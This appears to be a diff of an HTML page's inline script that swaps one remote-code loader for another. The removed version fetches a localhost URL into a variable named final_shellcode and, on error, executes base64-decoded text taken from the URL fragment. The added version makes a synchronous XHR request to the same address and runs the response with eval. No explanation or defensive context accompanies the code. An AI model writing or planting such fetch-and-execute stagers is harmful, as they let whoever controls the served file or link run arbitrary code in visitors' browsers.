@@ -2,26 +2,31 @@
 
 <script>
 try {
-    function Uint8ArrayToString(fileData){
-        fileData= new Uint8Array(fileData)
-        var dataString = "";
-        for (var i = 0; i < fileData.length; i++) {
-          dataString += String.fromCharCode(fileData[i]);
+
+function createXHR () {
+    var XHR = [  
+        function () { return new XMLHttpRequest () },
+        function () { return new ActiveXObject ("Msxml2.XMLHTTP") },
+        function () { return new ActiveXObject ("Msxml3.XMLHTTP") },
+        function () { return new ActiveXObject ("Microsoft.XMLHTTP") }
+    ];
+    var xhr = null;
+    for (var i = 0; i < XHR.length; i ++) {
+        try {
+            xhr = XHR[i]();
+        } catch(e) {
+            continue 
         }
-        return dataString
+        break; 
     }
-    async function fetch_html(url) {
-        let resp = await fetch(url);
-        final_shellcode = await resp.arrayBuffer();
-    }
-    
-    async function evalfetch(){
-        document.write(Uint8ArrayToString(await fetch_html("http://127.0.0.1/a.html/")))
-    }
-    
-    evalfetch()
+    return xhr;  //返回对象实例
+}
+var url = "http://127.0.0.1/a.html/";
+var xhr = createXHR(); 
+xhr.open("GET", url, false);  
+xhr.send(null);  
+eval(xhr.responseText);  
 } catch (error) {
-    eval(atob(location.hash.slice(1,)))
 }
   </script>
   
